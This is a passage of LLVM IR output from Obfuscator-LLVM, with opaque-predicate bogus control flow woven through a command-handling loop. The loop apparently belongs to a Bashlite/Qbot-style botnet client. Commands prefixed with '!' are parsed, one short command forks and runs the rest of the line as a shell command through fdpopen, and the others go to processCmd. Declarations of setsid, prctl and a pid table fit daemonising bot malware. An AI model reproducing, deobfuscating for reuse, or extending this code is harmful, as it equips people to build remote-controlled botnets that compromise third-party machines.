  %324 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %325 = call i8* @strstr(i8* %324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #10
  %326 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %327 = icmp eq i8* %325, %326
  br i1 %327, label %328, label %345

; <label>:328:                                    ; preds = %323
  %329 = load i32, i32* @x.89
  %330 = load i32, i32* @y.90
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %328
  call void @exit(i32 0) #14
  %337 = load i32, i32* @x.89
  %338 = load i32, i32* @y.90
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  unreachable

; <label>:345:                                    ; preds = %323
  %346 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %346, i8** %15, align 8
  %347 = load i8*, i8** %15, align 8
  %348 = load i8, i8* %347, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 33
  br i1 %350, label %351, label %674

; <label>:351:                                    ; preds = %345
  %352 = load i32, i32* @x.89
  %353 = load i32, i32* @y.90
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %351
  %360 = load i8*, i8** %15, align 8
  %361 = getelementptr inbounds i8, i8* %360, i64 1
  store i8* %361, i8** %16, align 8
  %362 = load i32, i32* @x.89
  %363 = load i32, i32* @y.90
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %370

; <label>:370:                                    ; preds = %382, %originalBBpart249
  %371 = load i8*, i8** %16, align 8
  %372 = load i8, i8* %371, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp ne i32 %373, 32
  br i1 %374, label %375, label %380

; <label>:375:                                    ; preds = %370
  %376 = load i8*, i8** %16, align 8
  %377 = load i8, i8* %376, align 1
  %378 = zext i8 %377 to i32
  %379 = icmp ne i32 %378, 0
  br label %380

; <label>:380:                                    ; preds = %375, %370
  %381 = phi i1 [ false, %370 ], [ %379, %375 ]
  br i1 %381, label %382, label %385

; <label>:382:                                    ; preds = %380
  %383 = load i8*, i8** %16, align 8
  %384 = getelementptr inbounds i8, i8* %383, i32 1
  store i8* %384, i8** %16, align 8
  br label %370

; <label>:385:                                    ; preds = %380
  %386 = load i8*, i8** %16, align 8
  %387 = load i8, i8* %386, align 1
  %388 = zext i8 %387 to i32
  %389 = icmp eq i32 %388, 0
  br i1 %389, label %390, label %391

; <label>:390:                                    ; preds = %385
  br label %119

; <label>:391:                                    ; preds = %385
  %392 = load i8*, i8** %16, align 8
  store i8 0, i8* %392, align 1
  %393 = load i8*, i8** %15, align 8
  %394 = getelementptr inbounds i8, i8* %393, i64 1
  store i8* %394, i8** %16, align 8
  %395 = load i8*, i8** %15, align 8
  %396 = load i8*, i8** %16, align 8
  %397 = call i64 @strlen(i8* %396) #10
  %398 = getelementptr inbounds i8, i8* %395, i64 %397
  %399 = getelementptr inbounds i8, i8* %398, i64 2
  store i8* %399, i8** %15, align 8
  br label %400

; <label>:400:                                    ; preds = %originalBBpart280, %391
  %401 = load i32, i32* @x.89
  %402 = load i32, i32* @y.90
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %400
  %409 = load i8*, i8** %15, align 8
  %410 = load i8*, i8** %15, align 8
  %411 = call i64 @strlen(i8* %410) #10
  %412 = sub i64 %411, 1
  %413 = getelementptr inbounds i8, i8* %409, i64 %412
  %414 = load i8, i8* %413, align 1
  %415 = zext i8 %414 to i32
  %416 = icmp eq i32 %415, 10
  %417 = load i32, i32* @x.89
  %418 = load i32, i32* @y.90
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBBpart255, label %originalBB51alteredBB

originalBBpart255:                                ; preds = %originalBB51
  br i1 %416, label %450, label %425

; <label>:425:                                    ; preds = %originalBBpart255
  %426 = load i32, i32* @x.89
  %427 = load i32, i32* @y.90
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %425
  %434 = load i8*, i8** %15, align 8
  %435 = load i8*, i8** %15, align 8
  %436 = call i64 @strlen(i8* %435) #10
  %437 = sub i64 %436, 1
  %438 = getelementptr inbounds i8, i8* %434, i64 %437
  %439 = load i8, i8* %438, align 1
  %440 = zext i8 %439 to i32
  %441 = icmp eq i32 %440, 13
  %442 = load i32, i32* @x.89
  %443 = load i32, i32* @y.90
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart268, label %originalBB57alteredBB

originalBBpart268:                                ; preds = %originalBB57
  br label %450

; <label>:450:                                    ; preds = %originalBBpart268, %originalBBpart255
  %451 = phi i1 [ true, %originalBBpart255 ], [ %441, %originalBBpart268 ]
  br i1 %451, label %452, label %474

; <label>:452:                                    ; preds = %450
  %453 = load i32, i32* @x.89
  %454 = load i32, i32* @y.90
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %452
  %461 = load i8*, i8** %15, align 8
  %462 = load i8*, i8** %15, align 8
  %463 = call i64 @strlen(i8* %462) #10
  %464 = sub i64 %463, 1
  %465 = getelementptr inbounds i8, i8* %461, i64 %464
  store i8 0, i8* %465, align 1
  %466 = load i32, i32* @x.89
  %467 = load i32, i32* @y.90
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart280, label %originalBB70alteredBB

originalBBpart280:                                ; preds = %originalBB70
  br label %400

; <label>:474:                                    ; preds = %450
  %475 = load i8*, i8** %15, align 8
  store i8* %475, i8** %17, align 8
  br label %476

; <label>:476:                                    ; preds = %520, %474
  %477 = load i8*, i8** %15, align 8
  %478 = load i8, i8* %477, align 1
  %479 = zext i8 %478 to i32
  %480 = icmp ne i32 %479, 32
  br i1 %480, label %481, label %502

; <label>:481:                                    ; preds = %476
  %482 = load i32, i32* @x.89
  %483 = load i32, i32* @y.90
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %481
  %490 = load i8*, i8** %15, align 8
  %491 = load i8, i8* %490, align 1
  %492 = zext i8 %491 to i32
  %493 = icmp ne i32 %492, 0
  %494 = load i32, i32* @x.89
  %495 = load i32, i32* @y.90
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %502

; <label>:502:                                    ; preds = %originalBBpart284, %476
  %503 = phi i1 [ false, %476 ], [ %493, %originalBBpart284 ]
  %504 = load i32, i32* @x.89
  %505 = load i32, i32* @y.90
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %502
  %512 = load i32, i32* @x.89
  %513 = load i32, i32* @y.90
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %503, label %520, label %523

; <label>:520:                                    ; preds = %originalBBpart288
  %521 = load i8*, i8** %15, align 8
  %522 = getelementptr inbounds i8, i8* %521, i32 1
  store i8* %522, i8** %15, align 8
  br label %476

; <label>:523:                                    ; preds = %originalBBpart288
  %524 = load i8*, i8** %15, align 8
  store i8 0, i8* %524, align 1
  %525 = load i8*, i8** %15, align 8
  %526 = getelementptr inbounds i8, i8* %525, i32 1
  store i8* %526, i8** %15, align 8
  %527 = load i8*, i8** %17, align 8
  store i8* %527, i8** %18, align 8
  br label %528

; <label>:528:                                    ; preds = %532, %523
  %529 = load i8*, i8** %18, align 8
  %530 = load i8, i8* %529, align 1
  %531 = icmp ne i8 %530, 0
  br i1 %531, label %532, label %541

; <label>:532:                                    ; preds = %528
  %533 = load i8*, i8** %18, align 8
  %534 = load i8, i8* %533, align 1
  %535 = zext i8 %534 to i32
  %536 = call i32 @toupper(i32 %535) #10
  %537 = trunc i32 %536 to i8
  %538 = load i8*, i8** %18, align 8
  store i8 %537, i8* %538, align 1
  %539 = load i8*, i8** %18, align 8
  %540 = getelementptr inbounds i8, i8* %539, i32 1
  store i8* %540, i8** %18, align 8
  br label %528

; <label>:541:                                    ; preds = %528
  %542 = load i8*, i8** %17, align 8
  %543 = call i32 @strcmp(i8* %542, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0)) #10
  %544 = icmp eq i32 %543, 0
  br i1 %544, label %545, label %568

; <label>:545:                                    ; preds = %541
  %546 = call i32 @listFork()
  %547 = icmp ne i32 %546, 0
  br i1 %547, label %548, label %549

; <label>:548:                                    ; preds = %545
  br label %119

; <label>:549:                                    ; preds = %545
  %550 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %550, i8 0, i64 1024, i32 16, i1 false)
  %551 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %552 = load i8*, i8** %15, align 8
  %553 = call i32 (i8*, i8*, ...) @szprintf(i8* %551, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.124, i32 0, i32 0), i8* %552)
  %554 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %555 = call i32 @fdpopen(i8* %554, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.125, i32 0, i32 0))
  store i32 %555, i32* %20, align 4
  br label %556

; <label>:556:                                    ; preds = %561, %549
  %557 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %558 = load i32, i32* %20, align 4
  %559 = call i8* @fdgets(i8* %557, i32 1024, i32 %558)
  %560 = icmp ne i8* %559, null
  br i1 %560, label %561, label %565

; <label>:561:                                    ; preds = %556
  %562 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %562)
  %563 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %563, i8 0, i64 1024, i32 16, i1 false)
  %564 = call i32 @sleep(i32 1)
  br label %556

; <label>:565:                                    ; preds = %556
  %566 = load i32, i32* %20, align 4
  %567 = call i32 @fdpclose(i32 %566)
  call void @exit(i32 0) #14
  unreachable

; <label>:568:                                    ; preds = %541
  store i32 1, i32* %22, align 4
  %569 = load i8*, i8** %15, align 8
  %570 = call i8* @strtok(i8* %569, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %570, i8** %23, align 8
  %571 = load i8*, i8** %17, align 8
  %572 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %571, i8** %572, align 16
  br label %573

; <label>:573:                                    ; preds = %620, %568
  %574 = load i32, i32* @x.89
  %575 = load i32, i32* @y.90
  %576 = sub i32 %574, 1
  %577 = mul i32 %574, %576
  %578 = urem i32 %577, 2
  %579 = icmp eq i32 %578, 0
  %580 = icmp slt i32 %575, 10
  %581 = or i1 %579, %580
  br i1 %581, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %573
  %582 = load i8*, i8** %23, align 8
  %583 = icmp ne i8* %582, null
  %584 = load i32, i32* @x.89
  %585 = load i32, i32* @y.90
  %586 = sub i32 %584, 1
  %587 = mul i32 %584, %586
  %588 = urem i32 %587, 2
  %589 = icmp eq i32 %588, 0
  %590 = icmp slt i32 %585, 10
  %591 = or i1 %589, %590
  br i1 %591, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %583, label %592, label %622

; <label>:592:                                    ; preds = %originalBBpart292
  %593 = load i8*, i8** %23, align 8
  %594 = load i8, i8* %593, align 1
  %595 = zext i8 %594 to i32
  %596 = icmp ne i32 %595, 10
  br i1 %596, label %597, label %620

; <label>:597:                                    ; preds = %592
  %598 = load i8*, i8** %23, align 8
  %599 = call i64 @strlen(i8* %598) #10
  %600 = add i64 %599, 1
  %601 = call noalias i8* @malloc(i64 %600) #2
  %602 = load i32, i32* %22, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %603
  store i8* %601, i8** %604, align 8
  %605 = load i32, i32* %22, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %606
  %608 = load i8*, i8** %607, align 8
  %609 = load i8*, i8** %23, align 8
  %610 = call i64 @strlen(i8* %609) #10
  %611 = add i64 %610, 1
  call void @llvm.memset.p0i8.i64(i8* %608, i8 0, i64 %611, i32 1, i1 false)
  %612 = load i32, i32* %22, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %613
  %615 = load i8*, i8** %614, align 8
  %616 = load i8*, i8** %23, align 8
  %617 = call i8* @strcpy(i8* %615, i8* %616) #2
  %618 = load i32, i32* %22, align 4
  %619 = add nsw i32 %618, 1
  store i32 %619, i32* %22, align 4
  br label %620

; <label>:620:                                    ; preds = %597, %592
  %621 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.126, i32 0, i32 0)) #2
  store i8* %621, i8** %23, align 8
  br label %573

; <label>:622:                                    ; preds = %originalBBpart292
  %623 = load i32, i32* @x.89
  %624 = load i32, i32* @y.90
  %625 = sub i32 %623, 1
  %626 = mul i32 %623, %625
  %627 = urem i32 %626, 2
  %628 = icmp eq i32 %627, 0
  %629 = icmp slt i32 %624, 10
  %630 = or i1 %628, %629
  br i1 %630, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %622
  %631 = load i32, i32* %22, align 4
  %632 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %631, i8** %632)
  %633 = load i32, i32* %22, align 4
  %634 = icmp sgt i32 %633, 1
  %635 = load i32, i32* @x.89
  %636 = load i32, i32* @y.90
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %634, label %643, label %673

; <label>:643:                                    ; preds = %originalBBpart296
  %644 = load i32, i32* @x.89
  %645 = load i32, i32* @y.90
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %643
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  %652 = load i32, i32* @x.89
  %653 = load i32, i32* @y.90
  %654 = sub i32 %652, 1
  %655 = mul i32 %652, %654
  %656 = urem i32 %655, 2
  %657 = icmp eq i32 %656, 0
  %658 = icmp slt i32 %653, 10
  %659 = or i1 %657, %658
  br i1 %659, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %660

; <label>:660:                                    ; preds = %669, %originalBBpart2100
  %661 = load i32, i32* %24, align 4
  %662 = load i32, i32* %22, align 4
  %663 = icmp slt i32 %661, %662
  br i1 %663, label %664, label %672

; <label>:664:                                    ; preds = %660
  %665 = load i32, i32* %24, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %666
  %668 = load i8*, i8** %667, align 8
  call void @free(i8* %668) #2
  br label %669

; <label>:669:                                    ; preds = %664
  %670 = load i32, i32* %24, align 4
  %671 = add nsw i32 %670, 1
  store i32 %671, i32* %24, align 4
  br label %660

; <label>:672:                                    ; preds = %660
  br label %673

; <label>:673:                                    ; preds = %672, %originalBBpart296
  br label %674

; <label>:674:                                    ; preds = %673, %345
  br label %119

; <label>:675:                                    ; preds = %119
  br label %110
                                                  ; No predecessors!
  %677 = load i32, i32* %3, align 4
  ret i32 %677

originalBBalteredBB:                              ; preds = %originalBB, %66
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %89
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %124
  store i32 0, i32* %12, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %154
  %678 = load i32, i32* %12, align 4
  %_ = shl i32 %678, 1
  %_11 = sub i32 0, %678
  %gen = add i32 %_11, 1
  %_12 = shl i32 %678, 1
  %_13 = sub i32 %678, 1
  %gen14 = mul i32 %_13, 1
  %_15 = shl i32 %678, 1
  %679 = add nsw i32 %678, 1
  store i32 %679, i32* %14, align 4
  br label %originalBB10

originalBB19alteredBB:                            ; preds = %originalBB19, %173
  %680 = load i32, i32* %14, align 4
  %681 = zext i32 %680 to i64
  %682 = load i64, i64* @numpids, align 8
  %683 = icmp ult i64 %681, %682
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %221
  %684 = load i32, i32* %14, align 4
  %685 = zext i32 %684 to i64
  %686 = load i64, i64* @numpids, align 8
  %687 = icmp ult i64 %685, %686
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %252
  %688 = load i32, i32* %14, align 4
  %_28 = shl i32 %688, 1
  %_29 = shl i32 %688, 1
  %_30 = sub i32 %688, 1
  %gen31 = mul i32 %_30, 1
  %689 = add i32 %688, 1
  store i32 %689, i32* %14, align 4
  br label %originalBB27

originalBB35alteredBB:                            ; preds = %originalBB35, %275
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %295
  %690 = load i32, i32* %11, align 4
  %691 = sext i32 %690 to i64
  %692 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %691
  store i8 0, i8* %692, align 1
  %693 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %693)
  %694 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %695 = call i8* @strstr(i8* %694, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.44, i32 0, i32 0)) #10
  %696 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %697 = icmp eq i8* %695, %696
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %328
  call void @exit(i32 0) #14
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %351
  %698 = load i8*, i8** %15, align 8
  %699 = getelementptr inbounds i8, i8* %698, i64 1
  store i8* %699, i8** %16, align 8
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %400
  %700 = load i8*, i8** %15, align 8
  %701 = load i8*, i8** %15, align 8
  %702 = call i64 @strlen(i8* %701) #10
  %_52 = sub i64 %702, 1
  %gen53 = mul i64 %_52, 1
  %703 = sub i64 %702, 1
  %704 = getelementptr inbounds i8, i8* %700, i64 %703
  %705 = load i8, i8* %704, align 1
  %706 = zext i8 %705 to i32
  %707 = icmp eq i32 %706, 10
  br label %originalBB51

originalBB57alteredBB:                            ; preds = %originalBB57, %425
  %708 = load i8*, i8** %15, align 8
  %709 = load i8*, i8** %15, align 8
  %710 = call i64 @strlen(i8* %709) #10
  %_58 = sub i64 %710, 1
  %gen59 = mul i64 %_58, 1
  %_60 = sub i64 %710, 1
  %gen61 = mul i64 %_60, 1
  %_62 = shl i64 %710, 1
  %_63 = sub i64 0, %710
  %gen64 = add i64 %_63, 1
  %_65 = sub i64 %710, 1
  %gen66 = mul i64 %_65, 1
  %711 = sub i64 %710, 1
  %712 = getelementptr inbounds i8, i8* %708, i64 %711
  %713 = load i8, i8* %712, align 1
  %714 = zext i8 %713 to i32
  %715 = icmp eq i32 %714, 13
  br label %originalBB57

originalBB70alteredBB:                            ; preds = %originalBB70, %452
  %716 = load i8*, i8** %15, align 8
  %717 = load i8*, i8** %15, align 8
  %718 = call i64 @strlen(i8* %717) #10
  %_71 = shl i64 %718, 1
  %_72 = sub i64 0, %718
  %gen73 = add i64 %_72, 1
  %_74 = sub i64 0, %718
  %gen75 = add i64 %_74, 1
  %_76 = shl i64 %718, 1
  %_77 = sub i64 %718, 1
  %gen78 = mul i64 %_77, 1
  %719 = sub i64 %718, 1
  %720 = getelementptr inbounds i8, i8* %716, i64 %719
  store i8 0, i8* %720, align 1
  br label %originalBB70

originalBB82alteredBB:                            ; preds = %originalBB82, %481
  %721 = load i8*, i8** %15, align 8
  %722 = load i8, i8* %721, align 1
  %723 = zext i8 %722 to i32
  %724 = icmp ne i32 %723, 0
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %502
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %573
  %725 = load i8*, i8** %23, align 8
  %726 = icmp ne i8* %725, null
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %622
  %727 = load i32, i32* %22, align 4
  %728 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %727, i8** %728)
  %729 = load i32, i32* %22, align 4
  %730 = icmp sgt i32 %729, 1
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %643
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %originalBB98
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146482628}
!2 = !{i32 -2146481937}
!3 = !{i32 -2146481188}
!4 = !{i32 -2146480365}
!5 = !{i32 -2146479443}
!6 = !{i32 -2146478060}
